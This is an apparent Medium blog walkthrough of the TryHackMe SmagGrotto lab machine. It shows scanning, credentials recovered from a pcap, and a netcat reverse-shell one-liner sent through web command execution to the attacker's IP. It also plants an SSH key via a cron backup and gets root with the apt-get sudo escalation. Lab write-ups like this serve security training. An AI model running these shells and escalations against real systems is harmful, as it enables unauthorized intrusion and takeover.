<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>SmagGrotto Walkthrough</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">SmagGrotto Walkthrough</h1>
</header>
<section data-field="subtitle" class="p-summary">
This is the walkthrough of the SmagGrotto Machine in TryHackMe.
</section>
<section data-field="body" class="e-content">
<section name="9ccc" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="e1e0" id="e1e0" class="graf graf--h3 graf--leading graf--title">SmagGrotto Walkthrough</h3><p name="4324" id="4324" class="graf graf--p graf-after--h3">This is the walkthrough of the SmagGrotto Machine in TryHackMe.</p><p name="7620" id="7620" class="graf graf--p graf-after--p">Hey Guys,I hope you like this walkthrough.Without wasting any time,let’s get started.</p><p name="f737" id="f737" class="graf graf--p graf-after--p">First let’’s do a nmap scan</p><p name="e14c" id="e14c" class="graf graf--p graf-after--p">sudo nmap -sT -sV -T4 10.10.97.254</p><p name="9f46" id="9f46" class="graf graf--p graf-after--p">Starting Nmap 7.60 ( <a href="https://nmap.org" data-href="https://nmap.org" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener" target="_blank">https://nmap.org</a> ) at 2022–03–29 18:44 BST<br>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 50.00% done; ETC: 18:45 (0:00:06 remaining)<br>Nmap scan report for ip-10–10–97–254.eu-west-1.compute.internal (10.10.97.254)<br>Host is up (0.0022s latency).<br>Not shown: 998 closed ports<br>PORT STATE SERVICE VERSION<br>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>80/tcp open http Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 02:6C:AC:F9:2E:ED (Unknown)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p name="9083" id="9083" class="graf graf--p graf-after--p">Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/" data-href="https://nmap.org/submit/" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener" target="_blank">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds</p><p name="460d" id="460d" class="graf graf--p graf-after--p">ports open:<br>22-ssh<br>80-http</p><p name="cd83" id="cd83" class="graf graf--p graf-after--p">let’s open the webpage</p><figure name="54a4" id="54a4" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*6fRC1OvfjdszLTvkeJe2KQ.png" data-width="1920" data-height="1000" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*6fRC1OvfjdszLTvkeJe2KQ.png"><figcaption class="imageCaption">This is the Webpage</figcaption></figure><p name="2d86" id="2d86" class="graf graf--p graf-after--figure">Let’s run a Gobuster scan to see what all subdomains are available.</p><p name="aa34" id="aa34" class="graf graf--p graf-after--p">Gobuster v3.0.1<br>by OJ Reeves (<a href="http://twitter.com/TheColonial" data-href="http://twitter.com/TheColonial" class="markup--anchor markup--p-anchor" title="Twitter profile for @TheColonial" rel="noopener" target="_blank">@TheColonial</a>) &amp; Christian Mehlmauer (<a href="http://twitter.com/_FireFart_" data-href="http://twitter.com/_FireFart_" class="markup--anchor markup--p-anchor" title="Twitter profile for @_FireFart_" rel="noopener" target="_blank">@_FireFart_</a>)<br>===============================================================<br>[+] Url: <a href="http://10.10.97.254" data-href="http://10.10.97.254" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">http://10.10.97.254</a><br>[+] Threads: 10<br>[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Status codes: 200,204,301,302,307,401,403<br>[+] User Agent: gobuster/3.0.1<br>[+] Timeout: 10s<br>===============================================================<br>2022/03/29 18:53:43 Starting gobuster<br>===============================================================<br>/mail (Status: 301)<br>/server-status (Status: 403)<br>2022/03/29 18:55:09 Finished</p><p name="3dbc" id="3dbc" class="graf graf--p graf-after--p">Let’s try to see what the subdomains contain.</p><p name="804b" id="804b" class="graf graf--p graf-after--p">The /server-status doesn’t contain any useful information.</p><figure name="709e" id="709e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*PuexAF-cPvtwMfnaudBP2w.png" data-width="1920" data-height="947" alt="The /server-status webpage" src="https://cdn-images-1.medium.com/max/800/1*PuexAF-cPvtwMfnaudBP2w.png"><figcaption class="imageCaption">The /server-status webpage</figcaption></figure><p name="cd36" id="cd36" class="graf graf--p graf-after--figure">The /mail contains quite a lot of interesting information.</p><figure name="869e" id="869e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*Qi4UlE_-E8TejLz7CdXcMA.png" data-width="1920" data-height="1018" src="https://cdn-images-1.medium.com/max/800/1*Qi4UlE_-E8TejLz7CdXcMA.png"><figcaption class="imageCaption">The /mail webpage</figcaption></figure><p name="aefc" id="aefc" class="graf graf--p graf-after--figure">There is a very very interesting file, it is called <a href="http://10.10.135.61/aW1wb3J0YW50/dHJhY2Uy.pcap" data-href="http://10.10.135.61/aW1wb3J0YW50/dHJhY2Uy.pcap" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">dHJhY2Uy.pcap</a> . Let us download this file.</p><p name="efab" id="efab" class="graf graf--p graf-after--p">More about .pcap file extensions: <a href="https://en.wikipedia.org/wiki/Pcap" data-href="https://en.wikipedia.org/wiki/Pcap" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://en.wikipedia.org/wiki/Pcap</a></p><p name="a98d" id="a98d" class="graf graf--p graf-after--p">We can use WireShark to sniff the network packets.</p><figure name="ede2" id="ede2" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*NI5cuP1ayRMZOJvhhOGrCg.png" data-width="1920" data-height="947" src="https://cdn-images-1.medium.com/max/800/1*NI5cuP1ayRMZOJvhhOGrCg.png"><figcaption class="imageCaption">WireShark Analyser</figcaption></figure><blockquote name="f050" id="f050" class="graf graf--blockquote graf-after--figure">POST /login.php HTTP/1.1<br>Host: development.smag.thm<br>User-Agent: curl/7.47.0<br>Accept: */*<br>Content-Length: 39<br>Content-Type: application/x-www-form-urlencoded</blockquote><blockquote name="3962" id="3962" class="graf graf--blockquote graf-after--blockquote">username=helpdesk&amp;password=cH4nG3M3_n0wHTTP/1.1 200 OK<br>Date: Wed, 03 Jun 2020 18:04:07 GMT<br>Server: Apache/2.4.18 (Ubuntu)<br>Content-Length: 0<br>Content-Type: text/html; charset=UTF-8</blockquote><figure name="5e3c" id="5e3c" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*xz5GuYXrv16TDeyPQf8lnQ.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*xz5GuYXrv16TDeyPQf8lnQ.png"><figcaption class="imageCaption">/etc/hosts file</figcaption></figure><p name="51ce" id="51ce" class="graf graf--p graf-after--figure">We get ‘development.smag.thm’ , add this to your /etc/hosts file.</p><p name="ec0b" id="ec0b" class="graf graf--p graf-after--p">Add your IP Address next to development.smag.thm</p><p name="b412" id="b412" class="graf graf--p graf-after--p">Open development.smag.thm</p><figure name="1172" id="1172" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YDen3XY09G-iMiBKgfG8nA.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*YDen3XY09G-iMiBKgfG8nA.png"><figcaption class="imageCaption">development.smag.thm</figcaption></figure><p name="f6d6" id="f6d6" class="graf graf--p graf-after--figure">This is very interesting, open login.php .</p><figure name="c5ba" id="c5ba" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*PqJGxU746fsr3Ds3o8OIOg.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*PqJGxU746fsr3Ds3o8OIOg.png"><figcaption class="imageCaption">Login Page</figcaption></figure><p name="6e5d" id="6e5d" class="graf graf--p graf-after--figure">Login with the credentials you got above.</p><figure name="ad1d" id="ad1d" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*r-pbh2EqKtvHKsBVFCiMig.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*r-pbh2EqKtvHKsBVFCiMig.png"><figcaption class="imageCaption">We get this page after login</figcaption></figure><p name="c9c8" id="c9c8" class="graf graf--p graf-after--figure">We get remote command execution,lets try to get a reverse shell.</p><p name="2180" id="2180" class="graf graf--p graf-after--p">First we need to open a listener using netcat.</p><p name="719d" id="719d" class="graf graf--p graf-after--p">Here I am listening for a connection on 1337.</p><figure name="7e61" id="7e61" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*G20JGHdUHYO8E95K_58c2g.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*G20JGHdUHYO8E95K_58c2g.png"><figcaption class="imageCaption">Using netcat to listen for a reverse shell</figcaption></figure><p name="fe28" id="fe28" class="graf graf--p graf-after--figure">On the website where we have logged in,use the following command</p><p name="ef30" id="ef30" class="graf graf--p graf-after--p">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [yourmachineip] 1337&gt;/tmp/f</p><p name="a3f3" id="a3f3" class="graf graf--p graf-after--p">Remember* that your ip address will come from tryhackme vpn server,so don’t enter your Local internet IP Address.</p><figure name="7a15" id="7a15" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*nVanTP5apwQGI1KYgKpLLw.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*nVanTP5apwQGI1KYgKpLLw.png"><figcaption class="imageCaption">Type the command and hit Send</figcaption></figure><p name="aab2" id="aab2" class="graf graf--p graf-after--figure">After clicking on send,we get a reverse-shell</p><figure name="cd86" id="cd86" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*eQmiVXGXwLDfJCfl7zI8IA.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*eQmiVXGXwLDfJCfl7zI8IA.png"><figcaption class="imageCaption">Our Reverse Shell</figcaption></figure><p name="99b7" id="99b7" class="graf graf--p graf-after--figure">We only have a user of www-data[user can be found on typing whoami]</p><p name="f4fb" id="f4fb" class="graf graf--p graf-after--p">Now on your attacking machine, clone linenum.sh using Git and save it to your Desktop</p><p name="6697" id="6697" class="graf graf--p graf-after--p">Link:<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" data-href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p><p name="5fba" id="5fba" class="graf graf--p graf-after--p">Run Simple HTTP server on python.</p><figure name="3f7d" id="3f7d" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*6Bp4hzZTDpNhgaPbRPU-2A.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*6Bp4hzZTDpNhgaPbRPU-2A.png"><figcaption class="imageCaption">Running the simple http server</figcaption></figure><p name="6a7c" id="6a7c" class="graf graf--p graf-after--figure">Transfer linpeas.sh to target machine using wget.</p><p name="7912" id="7912" class="graf graf--p graf-after--p">we find there is a cronjob vulnerability</p><p name="418c" id="418c" class="graf graf--p graf-after--p">therefore ssh vulnerablility,lets copy our public key to their backup</p><p name="0a9d" id="0a9d" class="graf graf--p graf-after--p">we have sucessfully added it</p><p name="69b0" id="69b0" class="graf graf--p graf-after--p">if you don’t have a public key,use: <strong class="markup--strong markup--p-strong">ssh-keygen -o</strong></p><figure name="1143" id="1143" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*G3hmR9cB6FfzX2lpUD8dzw.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*G3hmR9cB6FfzX2lpUD8dzw.png"><figcaption class="imageCaption">Making of SSH Key</figcaption></figure><p name="ae70" id="ae70" class="graf graf--p graf-after--figure">Copy your ssh public key</p><p name="8983" id="8983" class="graf graf--p graf-after--p">Lets add our public key using echo command</p><p name="9f6c" id="9f6c" class="graf graf--p graf-after--p">echo “Your Public key” &gt; jake_id_rsa.pub.backup</p><p name="274a" id="274a" class="graf graf--p graf-after--p">[Copy every single letter from your public key to the above command]</p><p name="efba" id="efba" class="graf graf--p graf-after--p">ssh -i [Path to your ssh key] jake@targetip</p><figure name="739a" id="739a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*Q0tr37IgRj9UpboRY3XohQ.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*Q0tr37IgRj9UpboRY3XohQ.png"><figcaption class="imageCaption">SSH to jake</figcaption></figure><p name="bda3" id="bda3" class="graf graf--p graf-after--figure">Now we have permissions to access user.txt,</p><figure name="2021" id="2021" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*R78GLU5O9Y6i9Xdw0dlBhQ.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*R78GLU5O9Y6i9Xdw0dlBhQ.png"><figcaption class="imageCaption">contents of user.txt</figcaption></figure><p name="1d6f" id="1d6f" class="graf graf--p graf-after--figure">We have got the first flag,now lets find the second flag</p><p name="2f71" id="2f71" class="graf graf--p graf-after--p">Type ‘sudo -l’ to find which permissions does jake have.</p><figure name="df49" id="df49" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*fP3k0361UNh377zK7gFhXA.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*fP3k0361UNh377zK7gFhXA.png"><figcaption class="imageCaption">Jake permissions</figcaption></figure><p name="45c8" id="45c8" class="graf graf--p graf-after--figure">Let’s go to <a href="http://gtfobins.github.io" data-href="http://gtfobins.github.io" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">gtfobins.github.io</a> to search for vulnerabilities and search for apt-get vulnerabilities.</p><figure name="7071" id="7071" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*UxeRYSgTXCcdKdyP0ulunA.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*UxeRYSgTXCcdKdyP0ulunA.png"><figcaption class="imageCaption">Gtfobins apt-get</figcaption></figure><p name="f7fc" id="f7fc" class="graf graf--p graf-after--figure">Copy this command for Root Shell:<code class="markup--code markup--p-code">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></p><p name="6c9e" id="6c9e" class="graf graf--p graf-after--p">Now we have got the root shell</p><figure name="4333" id="4333" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*tWmHYWYPD0uql6KiLR8MkA.png" data-width="1920" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*tWmHYWYPD0uql6KiLR8MkA.png"><figcaption class="imageCaption">Root Flag</figcaption></figure><p name="ca20" id="ca20" class="graf graf--p graf-after--figure">We have also got the root flag,I hope you liked this walkthrough</p><p name="4c07" id="4c07" class="graf graf--p graf-after--p">A like would mean the world for me</p><p name="8a5a" id="8a5a" class="graf graf--p graf-after--p">Contact me: v.v.adithya.2007@gmail.com</p><p name="5a53" id="5a53" class="graf graf--p graf-after--p graf--trailing">A like would mean the world</p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@vvadithya" class="p-author h-card">V V Adithya</a> on <a href="https://medium.com/p/6444abddc6f2"><time class="dt-published" datetime="2022-03-30T06:37:22.749Z">March 30, 2022</time></a>.</p><p><a href="https://medium.com/@vvadithya/smaggrotto-walkthrough-6444abddc6f2" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on March 30, 2022.</p></footer></article></body></html>